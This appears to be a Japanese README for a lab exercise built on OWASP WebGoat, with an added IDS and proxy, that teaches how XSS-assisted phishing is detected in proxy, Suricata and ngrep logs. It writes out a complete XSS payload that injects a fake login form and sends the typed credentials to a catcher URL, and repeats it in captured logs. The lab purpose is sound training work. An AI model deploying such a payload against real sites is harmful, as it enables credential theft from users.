# CySecが提供するWebGoatを利用した演習について
WebGoatは、ウェブアプリケーションに対してのセキュリティの教育を目的としてOWASP (The Open Web Application Security Project) により作成されたアプリケーションである。WebGoatでは、最も重大なウェブアプリケーションリスクOWASP トップ10の脆弱性とその攻撃手法をアプリケーション上で再現できる演習環境を提供しており、学習者は演習を通して脆弱性に対しての攻撃や対策について学ぶことができる。  

CySecが提供する本演習では、学習者に対してのセキュリティアラートの監視技法の教育を目的とし、WebGoatの環境にIDS (Intrusion Detection System) およびリバースプロキシを追加した環境を提供する。  

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/block.png" title="WebGoat演習環境構成図">

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/network.png" title="ネットワーク図">

## Motivation
OWASPトップ10において、クロスサイトスクリプティング (以下、XSS) は年間2位 (2010年)、3位 (2013年)、7位 (2017年) と徐々に順位は下げてきてはいるが、発生頻度としてはトップ10の脆弱性の中で全体として二番目であり、その攻撃事象や対策について理解を深めることは非常に重要である。  

XSSのトップ10における順位が近年降下した理由としては、ウェブアプリケーションを支える技術の成熟 (PHP、J2EE/JSP、ASP.NET等) や、自動検出ツールによるXSSの脆弱性検出の技術向上などが挙げられる。  

本演習では、OWASPのWebGoatを使用し、XSSの脆弱性に対しての攻撃が実行された際のログ取得やウェブスキャナによるスキャンの実行方法について紹介する。  

## Prerequisite
* VirtualBox
  * ゲストOS: Ubuntu 14.04
  * Install: docker, docker-compose
* Vagrant
  * Plugin: landrush, vagrant-vbguest

## Installation
* VirtualBox
1. $ cd apps/　　　
2. $ sudo docker-compose up --build　　　　
3. Browse to http://webgoat.cyexc-target/WebGoat　　　
4. Browse to http://webgoat.cyexc-target:9292/ for arachni　　　　　
* Vagrant　　　
1. $ vagrant up --provision　　　   
2. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
   webgoat.cyexc-target           192.168.33.10　　　         
   10.33.168.192.in-addr.arpa     webgoat.cyexc-target　　　  
3. vagrant ssh　　　   
   i. $ cd apps/　　　　　    
   ii.$ sudo docker-compose up --build　　　　　    
   iii. Browse to http://webgoat.cyexc-target/WebGoat　　　　　　    
   iv. Browse to http://webgoat.cyexc-target:9292/ for arachni　　　   
   
## XSS脆弱性を用いたフィッシング補助
### 学習目標
XSS脆弱性があるWEBページが、どのようにして｢フィッシング攻撃｣として利用されるのか、またログからの検知方法を学習する。
### シナリオ
XSS脆弱性がある｢検索サービスを提供するWEBサイト"target.server"｣があるとする。このtarget.serverは認証を必要とする。target.serverの検索ページで検索フィールドに｢test｣を入力し｢SUBMIT｣ボタンを押した場合、WEBアプリケーションサーバに以下のようなリクエストを送信する。   

ie) http://target.server/searchform?Input=test&SUBMIT=Search

被害者が誤まってこのようなフィッシングページで｢検索文字列｣と共に｢スクリプトを含む有害なコード｣がtarget.serverに送信されると、被害者のブラウザにtarget.serverサイトから｢検索結果｣と認証のためにユーザ名とパスワードの入力を促すページが表示される。被害者は、誤まったtarget.serverからの要求と思わずにユーザ名とパスワードを入力してしまうと、攻撃者に被害者の個人情報が漏れてしまう。
### WebGoatの学習
｢フィッシング用ページ｣と｢情報収集サーバ｣を用意する代わりに、WebGoat｢Phishing with XSS｣に｢攻撃コード｣を注入し、認証を促すページを表示させる。ユーザが認証情報を入力すると、ユーザ名とパスワードがポップアップ表示される。  

<img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/flow.png" title="学習の流れ">

### Steps
   1. ｢Phishing with XSS｣ページを開き、｢Search｣フィルドに作成した｢有害スクリプトを含む認証ページ｣を入力し、「Search｣ボタンをクリックする。   
  
   <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step1.png" title="Step 1">   
  
   2. 表示された｢認証ページ｣にユーザIDとパスワードを入力し、送信する。   
     ex)
     ``</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.33.10/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>``   
    
   <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step2.png" width="270" height="240" title="Step 2">   
  
   3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    

### proxyサーバログの検知
vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log
[18/Jan/2018:13:02:12 +0000] "GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> HTTP/1.1" 200 0 "http://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"

"http&#58;//webgoat.cyexc-target/WebGoat/start.mvc"へのGETリクエストでuserとpasswordの値が漏れていることがわかる。
取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/proxy.log)

### IDSログの検知
vagrant@www:~/apps$ cp /var/log/suricata/http.log .
01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)

IDSのhttpログからも、"http&#58;//webgoat.cyexc-target/WebGoat/start.mvc"でuserとpasswordの情報が漏れていることがわかる。
取得したログはこちら＠[http.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/http.log)

### WEBスキャナー（Arachni）の実施
どのような脆弱性が"http&#58;//webgoat.cyexc-target/WebGoat/start.mvc"に存在するのかWEBスキャナーを実施する。
*NOTE: DockerネットワークにDNSサーバを置いていないので、WebGoatのdocker IPアドレスを使ってスキャンを実施する。*

<img src="http://htmlpreview.github.com/?https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/scan.png" title="Archniスキャン">  

"http&#58;//webgoat.cyexc-target/WebGoat/start.mvc"に対して、"Unencrypted password form"や"Clickjacking"を検出している。
取得したログはこちら＠[index.html](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/arachni/index.html) 

### proxyサーバでHTTP通信をキャプチャ
実際にどのようなことが起きているのかは、WEBサーバのログを取得しないとわからない。

  1. proxyサーバにログイン
  vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
  2. ngrepを使用してHTTP通信をキャプチャ
  root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
  3. proxyサーバをログアウト
  root@c56fe08a3ea2:/#
  4. ゲストOSでproxyサーバのcontainer IDを調べる
  vagrant@webgoat:~/apps$ sudo docker ps
  CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
  937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
  64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
  425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
  5. 取得したngrepのログをゲストOSにコピー
  vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/ngrep.log)

ngrep.log
~~~~
/// 192.168.0.100(proxyサーバ)でXMLHttpRequestを受信
T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
Host: webgoat.cyexc-target.
Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
X-Requested-With: XMLHttpRequest.
``Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search``   

上記メッセージをnkfを使用してURLデコードすると、   
vagrant@webgoat:~$ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input    
/// 悪意のあるスクリプトが送られていることがわかる。    
``Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br><input+type="submit"+name="login"+value="login"+onclick="hack()"></form><br><br><HR>&SUBMIT=Search``

/// 192.168.0.100(proxyサーバ)から192.168.0.10(WebGoat)にXMLHttpRequestを送信
T 192.168.0.100:41064 -> 192.168.0.10:8080 [A]
POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
X-Real-IP: 192.168.33.1.
Host: webgoat.cyexc-target.
X-Requested-With: XMLHttpRequest.
``Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%``   

上記メッセージをnkfを使用してURLデコードすると、   
vagrant@webgoat:~$ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   
/// 悪意のあるスクリプトがWebGoatに送られていることがわかる。   
``Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br%``

## References
* [OWASP Top 10 2013](https://www.owasp.org/images/7/79/OWASP_Top_10_2013_JPN.pdf)
* [OWASP WebGoat Project](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)
* [OWASP ZAP Attack Proxy Project](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
* [arachini scanner](http://www.arachni-scanner.com/)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
